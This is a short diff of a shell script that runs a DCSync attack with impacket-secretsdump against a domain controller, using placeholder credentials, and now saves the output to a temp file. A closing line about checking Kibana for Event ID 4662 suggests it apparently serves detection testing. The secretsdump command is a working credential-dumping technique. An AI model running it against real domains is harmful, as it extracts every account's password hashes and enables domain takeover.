@@ -10,6 +10,6 @@ USERNAME="jsmith"
 PASSWORD="Password123!"
 
 echo "[*] Executing DCSync attack against $DC_IP"
-impacket-secretsdump "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" -just-dc
+impacket-secretsdump "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" -just-dc 2>&1 | tee /tmp/dcsync_out.txt
 
 echo "[*] Attack complete - check Kibana for Event ID 4662 with replication GUID 1131f6aa"
